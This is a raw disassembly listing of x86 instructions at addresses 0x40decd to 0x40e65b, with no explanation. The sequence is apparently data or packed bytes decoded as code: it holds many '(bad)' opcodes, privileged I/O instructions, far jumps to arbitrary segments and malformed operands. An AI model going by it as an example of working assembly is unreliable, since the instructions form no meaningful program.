  40decd:	mov    BYTE PTR [eax+0x79b33174],0x57
  40ded4:	xchg   ecx,eax
  40ded5:	adc    BYTE PTR [esi],cl
  40ded7:	aam    0xfe
  40ded9:	rol    BYTE PTR [ebp-0x344f1e00],cl
  40dedf:	(bad)  [edx]
  40dee1:	fisttp DWORD PTR [esi+ecx*4+0x4]
  40dee5:	stos   DWORD PTR es:[edi],eax
  40dee6:	pop    edx
  40dee7:	sbb    al,0x7c
  40dee9:	fsub   st(2),st
  40deeb:	and    bl,dh
  40deed:	mov    al,0xa8
  40deef:	mov    ds:0x59cca4ee,eax
  40def4:	outs   dx,BYTE PTR ds:[esi]
  40def5:	lds    ebp,FWORD PTR [edi+0x1a00b632]
  40defb:	daa    
  40defc:	fcom   DWORD PTR [ecx+edx*8+0x60]
  40df00:	xchg   edx,eax
  40df01:	dec    edx
  40df02:	and    cl,BYTE PTR [edi-0x683883fc]
  40df08:	ret    0xe6aa
  40df0b:	lods   al,BYTE PTR ss:[esi]
  40df0d:	xchg   esp,eax
  40df0e:	xor    BYTE PTR ds:0x81b942c9,ch
  40df14:	mov    al,ds:0x603809a0
  40df19:	push   es
  40df1a:	test   BYTE PTR [esi-0xa],cl
  40df1d:	mov    eax,0xf4514760
  40df22:	push   0x1e5dd8e9
  40df27:	mov    ah,0x3a
  40df29:	add    ah,ah
  40df2b:	inc    esi
  40df2c:	push   ebx
  40df2d:	jnp    0x40df9a
  40df2f:	xor    dl,cl
  40df31:	mov    al,ds:0xac007735
  40df36:	cli    
  40df37:	push   edx
  40df38:	or     BYTE PTR [ebx],0x7e
  40df3b:	add    bl,BYTE PTR [ebx]
  40df3d:	add    al,0x8
  40df3f:	push   cs
  40df40:	add    dh,BYTE PTR [edi+0x16675324]
  40df46:	sbb    DWORD PTR [ebx+0x28724413],ebp
  40df4c:	dec    edx
  40df4d:	fdiv   DWORD PTR [eax+0x74]
  40df50:	sbb    BYTE PTR [edx+0x7238c0b0],bh
  40df56:	dec    edi
  40df57:	pop    dx
  40df59:	xlat   BYTE PTR ds:[ebx]
  40df5a:	add    eax,0x311e1860
  40df5f:	(bad)  
  40df60:	sub    dl,BYTE PTR [esi]
  40df62:	jb     0x40df38
  40df64:	mov    cl,BYTE PTR [edx]
  40df66:	or     ch,BYTE PTR [edx+eax*2+0x60]
  40df6a:	or     BYTE PTR [esi],ah
  40df6c:	int3   
  40df6d:	mov    eax,0xab4759d1
  40df72:	pop    eax
  40df73:	cwde   
  40df74:	gs push 0xffffff82
  40df77:	pop    es
  40df78:	xchg   esp,eax
  40df79:	sub    eax,0xbcf473ea
  40df7e:	mov    al,ds:0x8116a8a8
  40df83:	cmp    bl,ah
  40df85:	add    al,BYTE PTR [ebp+0x7e]
  40df88:	stos   DWORD PTR es:[edi],eax
  40df89:	push   edx
  40df8a:	add    BYTE PTR [esi],al
  40df8c:	pop    eax
  40df8d:	rcl    eax,1
  40df8f:	aad    0xda
  40df91:	in     al,dx
  40df92:	and    bh,BYTE PTR [esi]
  40df94:	cmp    ebp,DWORD PTR [ebx+eax*4-0x65c65f1e]
  40df9b:	pusha  
  40df9c:	ret    0xf2bc
  40df9f:	add    BYTE PTR [esi-0x25],dh
  40dfa2:	sbb    BYTE PTR [ebp+0x5],cl
  40dfa5:	lods   eax,DWORD PTR ds:[esi]
  40dfa6:	sbb    BYTE PTR [ebx],ah
  40dfa8:	mov    esi,0xa9a6c03
  40dfad:	pop    ebx
  40dfae:	inc    eax
  40dfaf:	sub    al,0xe8
  40dfb1:	xor    ah,BYTE PTR [esi-0x67db56da]
  40dfb7:	imul   esi,DWORD PTR ds:0x62f058ef,0x29
  40dfbe:	test   bl,al
  40dfc0:	inc    edx
  40dfc1:	jle    0x40e022
  40dfc3:	add    BYTE PTR [ebp+0x416d1a8d],ah
  40dfc9:	stos   DWORD PTR es:[edi],eax
  40dfca:	push   edx
  40dfcb:	pop    edx
  40dfcc:	jmpw   0x9b5e
  40dfd0:	mov    edx,0x2b227496
  40dfd5:	ins    DWORD PTR es:[edi],dx
  40dfd6:	mov    al,0x6f
  40dfd8:	int    0x0
  40dfda:	bound  esp,QWORD PTR [ebx+0x64c782]
  40dfe0:	cli    
  40dfe1:	jg     0x40dfad
  40dfe3:	mov    esp,0x289274b
  40dfe8:	fld    TBYTE PTR [eax+ebp*1-0x3483e917]
  40dfef:	inc    ebp
  40dff0:	xchg   esp,eax
  40dff1:	cmp    al,0xfe
  40dff3:	ret    
  40dff4:	mov    ch,0xca
  40dff6:	stos   BYTE PTR es:[edi],al
  40dff7:	fs jmp 0x6080:0xbcb10c88
  40dfff:	xor    esp,DWORD PTR [ebx+0x222a24a2]
  40e005:	push   edx
  40e006:	dec    eax
  40e007:	adc    BYTE PTR [ebx+ebx*4+0x41],al
  40e00b:	xchg   ecx,eax
  40e00c:	rcl    BYTE PTR [eax],cl
  40e00e:	pop    eax
  40e00f:	dec    esp
  40e010:	and    BYTE PTR [ecx-0x65e5fee2],0x6c
  40e017:	mov    edi,0xf8ee9a44
  40e01c:	and    BYTE PTR ds:0x51435570,ch
  40e022:	inc    ecx
  40e023:	jo     0x40e021
  40e025:	retf   0xd3c8
  40e028:	dec    edx
  40e029:	sbb    ecx,DWORD PTR [esi+0x6c]
  40e02c:	push   edi
  40e02d:	and    DWORD PTR [edx-0xb],0x9b6cace3
  40e034:	enter  0x2d73,0xe8
  40e038:	fld    TBYTE PTR [ebx]
  40e03a:	or     ch,BYTE PTR [edx]
  40e03c:	sbb    BYTE PTR [esp+esi*4],0xb9
  40e040:	pop    esi
  40e041:	ss add BYTE PTR es:[eax+0x16],al
  40e046:	mov    cl,BYTE PTR [eax+0x51]
  40e049:	rcl    DWORD PTR [eax+0x60],1
  40e04c:	inc    esi
  40e04d:	mov    al,BYTE PTR [ebx-0x2c]
  40e050:	cs mov esi,0x16a8746b
  40e056:	sub    ah,bh
  40e058:	ss cmp eax,0xf25ad8f5
  40e05e:	mov    DWORD PTR [edi+0x28367536],0x7e7287b8
  40e068:	push   edi
  40e069:	push   esp
  40e06a:	xchg   BYTE PTR [ebx+0x51],ah
  40e06d:	inc    ecx
  40e06e:	xchg   esi,eax
  40e06f:	xor    BYTE PTR [esi+0x56],ah
  40e072:	adc    DWORD PTR [esi],edi
  40e074:	xchg   esi,eax
  40e075:	dec    esp
  40e076:	fwait
  40e077:	mov    al,ah
  40e079:	push   0xcd28232c
  40e07e:	int    0x1c
  40e080:	aad    0x60
  40e082:	add    eax,0xe24ef0b6
  40e087:	ret    0x5878
  40e08a:	(bad)  
  40e08b:	(bad)  
  40e08c:	push   eax
  40e08d:	xchg   esi,eax
  40e08e:	(bad)  
  40e08f:	outs   dx,BYTE PTR ds:[esi]
  40e090:	or     eax,0x367e2d52
  40e095:	and    eax,0x54449a70
  40e09a:	adc    al,0x66
  40e09c:	jg     0x40e026
  40e09e:	leave  
  40e09f:	xor    al,0x20
  40e0a1:	and    DWORD PTR [edx-0x3b],0xe84dec91
  40e0a8:	scas   eax,DWORD PTR es:[edi]
  40e0a9:	cli    
  40e0aa:	inc    esi
  40e0ab:	push   es
  40e0ac:	inc    ebp
  40e0ad:	inc    ebp
  40e0ae:	inc    ebx
  40e0af:	inc    ecx
  40e0b0:	rcl    edx,0x25
  40e0b3:	mov    WORD PTR [ecx-0x6c],es
  40e0b6:	scas   al,BYTE PTR es:[edi]
  40e0b7:	loop   0x40e0fe
  40e0b9:	dec    ebp
  40e0ba:	or     eax,0x1a3e3066
  40e0bf:	xor    eax,0xf7a44770
  40e0c4:	inc    ebp
  40e0c5:	inc    ebp
  40e0c6:	adc    eax,0xe2197e1d
  40e0cb:	pop    esi
  40e0cc:	out    0x6f,al
  40e0ce:	or     BYTE PTR [edi+0x1db22f98],cl
  40e0d4:	test   al,0x44
  40e0d6:	add    DWORD PTR [edx+0xa0d75c],ebx
  40e0dc:	in     eax,dx
  40e0dd:	dec    edx
  40e0de:	add    eax,0xf4045605
  40e0e3:	fdiv   QWORD PTR [eax+0x36]
  40e0e6:	test   eax,0x6b57b01e
  40e0eb:	adc    eax,0x5420b986
  40e0f0:	adc    DWORD PTR [edx+0x32a094fb],ebx
  40e0f6:	push   ecx
  40e0f7:	test   DWORD PTR [eax-0x39b3729d],esp
  40e0fd:	in     al,dx
  40e0fe:	jmp    0x46e6:0x80800216
  40e105:	inc    ecx
  40e106:	jmp    0x40e0e6
  40e108:	cwde   
  40e109:	pop    esi
  40e10a:	mov    eax,0xd17f350c
  40e10f:	push   esi
  40e110:	jo     0x40e128
  40e112:	or     BYTE PTR [edi],0xdd
  40e115:	enter  0x8e,0x51
  40e119:	cmp    al,BYTE PTR [eax]
  40e11b:	push   es
  40e11c:	and    dl,dl
  40e11e:	aad    0x9a
  40e120:	mov    ds:0x240b94a0,eax
  40e125:	fst    DWORD PTR [edx]
  40e127:	add    al,0xa5
  40e129:	repnz sbb cl,BYTE PTR cs:[edx]
  40e12d:	push   eax
  40e12e:	push   esp
  40e12f:	pop    edx
  40e130:	sub    bh,BYTE PTR [esi]
  40e132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e133:	push   0xffffff8c
  40e135:	bound  edx,QWORD PTR [ecx-0x24fd278a]
  40e13b:	add    al,0x25
  40e13d:	dec    edi
  40e13e:	inc    eax
  40e13f:	mov    edx,0x78ca9c6c
  40e144:	mov    ebp,0xc1abb18f
  40e149:	sbb    dl,BYTE PTR [edx+0x2f2c763f]
  40e14f:	fiadd  DWORD PTR [eax+edi*2+0x4d05b430]
  40e156:	jbe    0x40e16e
  40e158:	adc    BYTE PTR [ecx+ebp*8+0x3eb5dc57],dh
  40e15f:	inc    ebp
  40e160:	and    DWORD PTR [edx+0x32ada22d],0x6c7c3476
  40e16a:	sbb    ebp,DWORD PTR [edx-0x3f]
  40e16d:	xchg   BYTE PTR [ebx],al
  40e16f:	arpl   cx,si
  40e171:	xchg   ebp,eax
  40e172:	xchg   edx,eax
  40e173:	retf   0xd0a4
  40e176:	fimul  WORD PTR [edx+0x228ec4fd]
  40e17c:	xchg   edx,eax
  40e17d:	(bad)  
  40e17e:	mov    ds:0x44f2543d,al
  40e183:	sar    DWORD PTR [edx+0x2e81da30],cl
  40e189:	ins    BYTE PTR es:[edi],dx
  40e18a:	push   ebp
  40e18b:	mov    BYTE PTR [ebx-0x5d719ebe],ah
  40e191:	or     eax,0x948578af
  40e196:	add    BYTE PTR [edx+ebp*4-0x60],bl
  40e19a:	out    dx,al
  40e19b:	cmp    BYTE PTR [esi-0x76],bl
  40e19e:	aam    0x65
  40e1a0:	pop    ds
  40e1a1:	test   BYTE PTR [eax+0x16d60160],dh
  40e1a7:	ds call 0xd49c026d
  40e1ad:	les    esp,FWORD PTR [esi+0x522abfe0]
  40e1b3:	into   
  40e1b4:	push   cs
  40e1b5:	mov    DWORD PTR [ebp+0x2cb64eab],ebp
  40e1bb:	xchg   DWORD PTR [eax],edx
  40e1bd:	lods   al,BYTE PTR ds:[si]
  40e1bf:	and    bh,BYTE PTR [edi-0x2f]
  40e1c2:	aad    0x65
  40e1c4:	or     ebp,DWORD PTR [esi+0x6834f808]
  40e1ca:	pop    ebx
  40e1cb:	es cdq 
  40e1cd:	pop    eax
  40e1ce:	add    BYTE PTR [esi],0xdb
  40e1d1:	xor    dh,cl
  40e1d3:	nop
  40e1d4:	mov    es,WORD PTR [esi+0x211d0418]
  40e1da:	inc    ebp
  40e1db:	add    eax,0x43248af6
  40e1e0:	es push ss
  40e1e2:	sbb    BYTE PTR [ebp-0x26],dh
  40e1e5:	jns    0x40e1e7
  40e1e7:	sub    eax,0xe18e6a68
  40e1ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1ed:	aam    0xc
  40e1ef:	imul   DWORD PTR [edi+0x70d0db06]
  40e1f5:	and    bh,ah
  40e1f7:	bnd jae 0x40e232
  40e1fa:	jle    0x40e233
  40e1fc:	mov    BYTE PTR [eax],ah
  40e1fe:	xor    eax,0xd782da88
  40e203:	cmp    WORD PTR [edx-0x1f4989ea],sp
  40e20a:	scas   eax,DWORD PTR es:[edi]
  40e20b:	dec    eax
  40e20c:	mov    cl,0xa0
  40e20e:	jne    0x40e27e
  40e210:	cli    
  40e211:	jo     0x40e290
  40e213:	jb     0x40e24c
  40e215:	adc    dh,0x2d
  40e218:	mov    dl,0xa
  40e21a:	mov    al,ds:0x5e0cf080
  40e21f:	push   0x38
  40e221:	leave  
  40e222:	into   
  40e223:	add    DWORD PTR [esp+edi*2],edx
  40e226:	xchg   ecx,eax
  40e227:	sub    BYTE PTR [esi-0x61],ch
  40e22a:	add    BYTE PTR [eax],0xc4
  40e22d:	and    al,0x9c
  40e22f:	mov    bl,0x5a
  40e231:	xlat   BYTE PTR ds:[ebx]
  40e232:	data16 jp 0x40e1d7
  40e235:	dec    ecx
  40e236:	xchg   DWORD PTR [eax-0x25d18972],esp
  40e23c:	ror    BYTE PTR [eax+0x4d4d0d97],0xd6
  40e243:	or     ah,BYTE PTR [esi+0x4f622ee]
  40e249:	ss in  al,dx
  40e24b:	das    
  40e24c:	ret    
  40e24d:	ss aaa 
  40e24f:	mov    ah,0x32
  40e251:	push   edx
  40e252:	js     0x40e28c
  40e254:	outs   dx,DWORD PTR ds:[esi]
  40e255:	add    BYTE PTR [esi],ah
  40e257:	pop    ss
  40e258:	fsub   st,st(2)
  40e25a:	push   0x78a9ad05
  40e25f:	mov    eax,0xd5041040
  40e264:	shl    BYTE PTR [eax-0x6c],0xd6
  40e268:	push   0xffffffaf
  40e26a:	test   al,0x68
  40e26c:	repnz mov ds:0xb1c4ac4c,al
  40e272:	xchg   ecx,eax
  40e273:	add    BYTE PTR ds:0x15aed7e8,al
  40e279:	sub    al,0x2a
  40e27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e27c:	mov    WORD PTR [edx+0x79cc50b9],ss
  40e282:	sbb    BYTE PTR [edi-0x77],0xe8
  40e286:	add    DWORD PTR ds:0x2cf636c3,esi
  40e28c:	out    dx,al
  40e28d:	or     dh,ch
  40e28f:	lahf   
  40e290:	pusha  
  40e291:	mov    ebx,0xd0fedb9a
  40e296:	push   cs
  40e297:	sub    al,0x12
  40e299:	cmp    al,0x4
  40e29b:	pop    ebx
  40e29c:	rcl    DWORD PTR [eax+0x50],cl
  40e29f:	adc    ah,BYTE PTR [ebx]
  40e2a1:	js     0x40e2de
  40e2a3:	ret    0x1100
  40e2a6:	and    cl,BYTE PTR [esp+ebx*1+0xd1bf007]
  40e2ad:	mov    esi,?
  40e2af:	mov    al,ds:0x5a50902d
  40e2b4:	inc    edi
  40e2b5:	inc    ebp
  40e2b6:	lds    eax,FWORD PTR [edi+0x795264e8]
  40e2bc:	push   es
  40e2bd:	int    0x16
  40e2bf:	das    
  40e2c0:	out    0x5f,al
  40e2c2:	sar    BYTE PTR [edx],1
  40e2c4:	and    al,0x74
  40e2c6:	xor    al,0x41
  40e2c8:	scas   al,BYTE PTR es:[edi]
  40e2c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ca:	mov    ecx,0x176500
  40e2cf:	ror    BYTE PTR [esi],1
  40e2d1:	sub    DWORD PTR [ebp-0x204baa96],0xffffffc4
  40e2d8:	mov    dl,0x36
  40e2da:	push   DWORD PTR [esi]
  40e2dc:	dec    esp
  40e2dd:	adc    al,0x1c
  40e2df:	ins    DWORD PTR es:[edi],dx
  40e2e0:	inc    ebp
  40e2e1:	push   ebx
  40e2e2:	jmp    0xda57a987
  40e2e7:	mov    ah,0x4
  40e2e9:	cdq    
  40e2ea:	sbb    BYTE PTR [edx-0x954bb2a],al
  40e2f0:	add    eax,DWORD PTR [edx]
  40e2f2:	(bad)  
  40e2f3:	and    bl,BYTE PTR [ecx]
  40e2f5:	mov    ss,WORD PTR [edi+0x207c6cba]
  40e2fb:	mov    dh,0x48
  40e2fd:	inc    eax
  40e2fe:	aad    0x6d
  40e300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e301:	bsf    ebx,DWORD PTR [ebx+0x75]
  40e305:	add    eax,0x1a3c7a74
  40e30a:	xchg   ebx,eax
  40e30b:	add    BYTE PTR [ebp+0x160f670c],dl
  40e311:	push   edi
  40e312:	shl    BYTE PTR [esi-0x5ff6d1f6],0xed
  40e319:	jo     0x40e319
  40e31b:	pop    ebp
  40e31c:	out    0x5,al
  40e31e:	add    eax,0x549f4805
  40e323:	ja     0x40e331
  40e325:	fcmove st,st(7)
  40e327:	add    BYTE PTR [ecx-0x76f7eb8a],bh
  40e32d:	icebp  
  40e32e:	adc    BYTE PTR [eax-0x62],ah
  40e331:	xchg   cx,sp
  40e334:	xchg   dh,dl
  40e336:	push   esi
  40e337:	sbb    DWORD PTR [esi+ebx*1-0x27],esi
  40e33b:	xor    edx,DWORD PTR [esi]
  40e33d:	add    eax,0x15a4d1e8
  40e342:	dec    esi
  40e343:	adc    DWORD PTR [ebp+0x62],eax
  40e346:	bnd jbe 0x40e325
  40e349:	sub    edx,DWORD PTR [ecx]
  40e34b:	hlt    
  40e34c:	dec    ebp
  40e34d:	pop    ebp
  40e34e:	stos   BYTE PTR es:[edi],al
  40e34f:	jge    0x40e373
  40e351:	les    edx,FWORD PTR [ecx+0x0]
  40e354:	push   0x5755cc1c
  40e359:	push   ebx
  40e35a:	rcl    DWORD PTR [esi+eax*1-0x10],0xf4
  40e35f:	in     eax,0xce
  40e361:	push   ecx
  40e362:	cld    
  40e363:	push   ecx
  40e364:	push   ebp
  40e365:	aad    0x6c
  40e367:	mov    ebx,0xcdca7655
  40e36c:	jle    0x40e397
  40e36e:	jmp    0x12d8:0xab230ddf
  40e375:	pop    ecx
  40e376:	mov    edx,0x56a602d6
  40e37b:	into   
  40e37c:	or     al,0xaa
  40e37e:	ins    DWORD PTR es:[edi],dx
  40e37f:	pushf  
  40e380:	lock fild WORD PTR [eax]
  40e383:	push   esi
  40e384:	(bad)  
  40e385:	or     BYTE PTR [esi],dh
  40e387:	adc    DWORD PTR [ecx+0x56],eax
  40e38a:	mov    ebx,DWORD PTR fs:[esi+eax*2+0x1a]
  40e38f:	loop   0x40e38f
  40e391:	xchg   edi,eax
  40e392:	les    eax,FWORD PTR [ecx+0x2b]
  40e395:	push   0x8e80a0ad
  40e39a:	(bad)  
  40e39b:	cli    
  40e39c:	adc    al,0x30
  40e39e:	inc    edx
  40e39f:	push   ss
  40e3a0:	push   0x6c
  40e3a2:	ins    BYTE PTR es:[edi],dx
  40e3a3:	push   ecx
  40e3a4:	inc    ebp
  40e3a5:	inc    ebp
  40e3a6:	pop    edx
  40e3a7:	or     bl,BYTE PTR [esi]
  40e3a9:	cmp    cl,al
  40e3ab:	je     0x40e35a
  40e3ad:	inc    edi
  40e3ae:	cmp    BYTE PTR [eax+0xa2ad8],ah
  40e3b4:	repz hlt 
  40e3b6:	test   al,0xbe
  40e3b8:	xchg   ebp,eax
  40e3b9:	mov    ebx,0xcaad60a
  40e3be:	fbld   TBYTE PTR [esi]
  40e3c0:	bound  edi,QWORD PTR [ebx+0x0]
  40e3c3:	mov    esp,DWORD PTR [edx+0x1a]
  40e3c6:	cmp    al,0x35
  40e3c8:	dec    esp
  40e3c9:	test   DWORD PTR [esi],edx
  40e3cb:	mov    al,BYTE PTR [esi+0x4406868a]
  40e3d1:	jb     0x40e3af
  40e3d3:	mov    esi,0xe2d02a4a
  40e3d8:	xor    DWORD PTR [esi-0x28],edx
  40e3db:	xor    ecx,DWORD PTR [ebp+0xf5552fa]
  40e3e1:	cli    
  40e3e2:	cmp    ebx,DWORD PTR [esp+ebp*2-0x59c3fbb3]
  40e3e9:	out    0xa,eax
  40e3eb:	xchg   esp,eax
  40e3ec:	xor    bh,BYTE PTR [edx]
  40e3ee:	jmp    0x40e376
  40e3f0:	int    0xa6
  40e3f2:	sub    DWORD PTR [edx],esi
  40e3f4:	int3   
  40e3f5:	(bad)  
  40e3f6:	mov    al,0x4d
  40e3f8:	(bad)  
  40e3fa:	lock xor al,0x4d
  40e3fd:	shl    DWORD PTR [esi+ecx*1],cl
  40e400:	cmp    al,0x95
  40e402:	or     eax,0xd34d3484
  40e407:	fadd   QWORD PTR [ebx+0x18b95500]
  40e40d:	add    edx,esp
  40e40f:	push   ecx
  40e410:	jnp    0x40e455
  40e412:	rcl    DWORD PTR [edi+0x4ed4442],cl
  40e418:	add    dh,ch
  40e41a:	adc    bh,dh
  40e41c:	repnz inc ecx
  40e41e:	push   ecx
  40e41f:	push   ebp
  40e420:	inc    ecx
  40e421:	inc    edi
  40e422:	dec    esi
  40e423:	test   eax,0xffcece66
  40e428:	fidivr WORD PTR [edx]
  40e42a:	int3   
  40e42b:	inc    esp
  40e42c:	inc    edi
  40e42d:	pop    ds
  40e42e:	cmp    al,0x51
  40e430:	stos   BYTE PTR es:[edi],al
  40e431:	in     al,0x6d
  40e433:	dec    ebp
  40e434:	mov    bl,0x69
  40e436:	mov    bh,dh
  40e438:	mov    ds:0xd548fccf,al
  40e43d:	pop    eax
  40e43e:	aaa    
  40e43f:	dec    ebp
  40e440:	shl    DWORD PTR [esi+edx*8],cl
  40e443:	ror    edx,1
  40e445:	dec    eax
  40e446:	pusha  
  40e447:	add    BYTE PTR [edx+0x34d34d34],ch
  40e44d:	sbb    ecx,edi
  40e44f:	aaa    
  40e450:	ins    BYTE PTR es:[edi],dx
  40e451:	(bad)  
  40e452:	mov    ah,0x45
  40e454:	sar    WORD PTR ds:0xbfbc9f62,cl
  40e45b:	adc    BYTE PTR [edx-0x4e],0xb7
  40e45f:	adc    eax,0x8a3a02f6
  40e464:	add    BYTE PTR [ebx-0x66],ah
  40e467:	mov    eax,0xbe707646
  40e46c:	les    eax,FWORD PTR [eax]
  40e46e:	outs   dx,BYTE PTR ds:[esi]
  40e46f:	mov    al,ds:0x168041a0
  40e474:	fadd   QWORD PTR [esi+0x13a00011]
  40e47a:	adc    eax,0x167ea80a
  40e47f:	inc    BYTE PTR [eax+0x1]
  40e482:	push   ecx
  40e483:	in     eax,0x94
  40e485:	jne    0x40e4ab
  40e487:	mov    BYTE PTR [eax+0x58],al
  40e48a:	pop    edx
  40e48b:	sub    edx,edi
  40e48d:	push   esi
  40e48e:	rcl    DWORD PTR [ecx+0x22],1
  40e491:	int    0xc0
  40e493:	push   ebp
  40e494:	inc    esi
  40e495:	in     al,dx
  40e496:	mov    ss,WORD PTR [edx-0x1d6fff94]
  40e49c:	xor    bl,BYTE PTR [ecx]
  40e49e:	pop    ebp
  40e49f:	pop    edi
  40e4a0:	push   0x96727a29
  40e4a5:	(bad)  
  40e4a6:	cmp    cl,BYTE PTR [ebx+edi*8+0x2]
  40e4aa:	xchg   BYTE PTR [eax-0x3baccfeb],bh
  40e4b0:	stos   DWORD PTR es:[edi],eax
  40e4b1:	cli    
  40e4b2:	pop    edx
  40e4b3:	fist   DWORD PTR [ecx-0x80]
  40e4b6:	rcl    BYTE PTR [esi],1
  40e4b8:	fmul   DWORD PTR [edx+0x6e0a8cc9]
  40e4be:	out    dx,al
  40e4bf:	xor    eax,0x9228135
  40e4c4:	and    al,0x68
  40e4c6:	in     al,0xce
  40e4c8:	and    dl,BYTE PTR [esi]
  40e4ca:	cwde   
  40e4cb:	and    bh,dh
  40e4cd:	push   ds
  40e4ce:	in     al,0x7d
  40e4d0:	dec    eax
  40e4d1:	pop    esp
  40e4d2:	test   BYTE PTR [ebx-0x48],cl
  40e4d5:	cld    
  40e4d6:	(bad)  
  40e4d7:	fdivr  st,st(6)
  40e4d9:	aam    0xd6
  40e4db:	stos   BYTE PTR es:[edi],al
  40e4dc:	mov    edx,0x8618359e
  40e4e1:	cli    
  40e4e2:	xor    al,0x16
  40e4e4:	dec    esp
  40e4e5:	stos   BYTE PTR es:[edi],al
  40e4e6:	or     DWORD PTR [ebx+0x28],0x78
  40e4ea:	jle    0x40e4c7
  40e4ec:	ins    BYTE PTR es:[edi],dx
  40e4ed:	dec    edx
  40e4ee:	mov    ah,0x56
  40e4f0:	stos   DWORD PTR es:[edi],eax
  40e4f1:	push   0x47
  40e4f3:	push   ebp
  40e4f4:	fwait
  40e4f5:	ss jne 0x40e52e
  40e4f8:	sub    bl,bl
  40e4fa:	lock mov ss,WORD PTR [ebp+0x18]
  40e4fe:	ss mov edi,0x5600827a
  40e504:	je     0x40e506
  40e506:	jmp    0x7339:0xd69ef513
  40e50d:	add    DWORD PTR [esi],esi
  40e50f:	xor    al,0x82
  40e511:	push   ebp
  40e512:	adc    al,0xe6
  40e514:	dec    esp
  40e515:	(bad)  
  40e516:	mov    ebx,0x66a28700
  40e51b:	adc    eax,0xa8a63f5b
  40e520:	mov    DWORD PTR [eax-0x2c05d1dd],ecx
  40e526:	mov    al,0x50
  40e528:	test   DWORD PTR [edx-0x4a7b7756],eax
  40e52e:	pop    edx
  40e52f:	push   ecx
  40e530:	les    ebx,FWORD PTR [ebx+0x68]
  40e533:	or     eax,0xa0fc4da2
  40e538:	sbb    edx,ebp
  40e53a:	mov    al,0x92
  40e53c:	imul   edx,DWORD PTR [esi],0x55
  40e53f:	mov    dh,0xc0
  40e541:	jl     0x40e4ee
  40e543:	hlt    
  40e544:	and    BYTE PTR [esi+0xa00b1df],cl
  40e54a:	pop    ebx
  40e54b:	js     0x40e5a8
  40e54d:	mov    bl,0x4c
  40e54f:	arpl   WORD PTR [ecx-0x7b],ax
  40e552:	mov    ch,0xc8
  40e554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e555:	mov    esp,0xe4333ae2
  40e55a:	ret    0x2bbd
  40e55d:	call   0x3ff4:0x50a441c1
  40e564:	inc    eax
  40e565:	dec    edi
  40e566:	push   0x33edd56
  40e56b:	xchg   esp,eax
  40e56c:	pusha  
  40e56d:	lods   al,BYTE PTR ds:[esi]
  40e56e:	adc    BYTE PTR [ebx],0x0
  40e571:	rol    eax,0x2b
  40e574:	hlt    
  40e575:	adc    al,0x8
  40e577:	mov    WORD PTR [edx-0x66e79378],?
  40e57d:	sub    eax,0x868cd68
  40e582:	and    dl,BYTE PTR [eax-0x1887524e]
  40e588:	pop    esp
  40e589:	fld    DWORD PTR [esi+0x634e03aa]
  40e58f:	inc    edx
  40e590:	cs loopne 0x40e562
  40e593:	xlat   BYTE PTR ds:[ebx]
  40e594:	jl     0x40e5c5
  40e596:	sub    BYTE PTR [eax-0x4a],ch
  40e599:	call   0x585daf79
  40e59e:	lea    ebp,[edx+edx*8-0x20]
  40e5a2:	jecxz  0x40e569
  40e5a4:	add    BYTE PTR [ebx+0x15],bh
  40e5a7:	stos   BYTE PTR es:[edi],al
  40e5a8:	dec    ebp
  40e5a9:	icebp  
  40e5aa:	pop    edx
  40e5ab:	add    BYTE PTR [edi+0x75],dl
  40e5ae:	mov    ss,WORD PTR [esi+edi*1-0x7f779324]
  40e5b5:	jo     0x40e5ba
  40e5b7:	or     eax,0x2ae658e
  40e5bc:	push   edx
  40e5bd:	dec    BYTE PTR [edx]
  40e5bf:	call   0x39f6:0x24fce8ed
  40e5c6:	adc    DWORD PTR [edx-0x6c],edx
  40e5c9:	outs   dx,DWORD PTR ds:[esi]
  40e5ca:	add    BYTE PTR [esi+ebp*4],dh
  40e5cd:	mov    bp,WORD PTR [edx]
  40e5d0:	add    al,0x1
  40e5d2:	(bad)  
  40e5d3:	in     eax,0x77
  40e5d5:	inc    eax
  40e5d6:	mov    BYTE PTR [edx],dh
  40e5d8:	cmp    BYTE PTR [eax+eiz*1+0x36],bh
  40e5dc:	mov    ch,0xf7
  40e5de:	cmp    BYTE PTR [edx],0x7c
  40e5e1:	xchg   esi,eax
  40e5e2:	(bad)  
  40e5e3:	xchg   edx,eax
  40e5e4:	je     0x40e5fc
  40e5e6:	push   eax
  40e5e7:	push   eax
  40e5e8:	lock inc esp
  40e5ea:	add    al,0x86
  40e5ec:	mov    ah,0x9f
  40e5ee:	fsubr  DWORD PTR [edi]
  40e5f0:	shl    BYTE PTR [esi],1
  40e5f2:	mov    ah,0x56
  40e5f4:	pusha  
  40e5f5:	rcl    DWORD PTR [eax],0x96
  40e5f8:	pop    eax
  40e5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5fa:	aam    0x46
  40e5fc:	das    
  40e5fd:	mov    eax,0xaf340e4
  40e602:	mov    ds:0x2d1ca6,eax
  40e607:	mov    ebx,DWORD PTR [eax]
  40e609:	cld    
  40e60a:	int    0x56
  40e60c:	sbb    al,0x8a
  40e60e:	xchg   ah,bh
  40e610:	adc    cl,ah
  40e612:	arpl   WORD PTR [edx],sp
  40e614:	adc    BYTE PTR [edi-0x4bf28b25],ah
  40e61a:	out    dx,al
  40e61b:	push   ss
  40e61c:	jae    0x40e696
  40e61e:	sub    eax,0xf4aff870
  40e623:	cmc    
  40e624:	push   cs
  40e625:	inc    ecx
  40e626:	inc    ecx
  40e627:	mov    dh,0x2a
  40e629:	push   es
  40e62a:	int3   
  40e62b:	cld    
  40e62c:	pop    WORD PTR [eax]
  40e62f:	pop    esi
  40e630:	mov    edx,0x785b5a34
  40e635:	retf   0xbe5e
  40e638:	aad    0x10
  40e63a:	outs   dx,BYTE PTR ds:[esi]
  40e63b:	xor    bh,0x51
  40e63e:	hlt    
  40e63f:	dec    eax
  40e640:	sub    al,0xec
  40e642:	sbb    DWORD PTR [esi-0x5e],edi
  40e645:	outs   dx,DWORD PTR ds:[esi]
  40e646:	mov    WORD PTR [edi+0x51342b06],cs
  40e64c:	fs pushf 
  40e64e:	jb     0x40e664
  40e650:	or     BYTE PTR [eax],0xa2
  40e653:	sar    BYTE PTR [edx+0x11aa0014],0x34
  40e65a:	ins    BYTE PTR es:[edi],dx
  40e65b:	outs   dx,BYTE PTR ds:[esi]
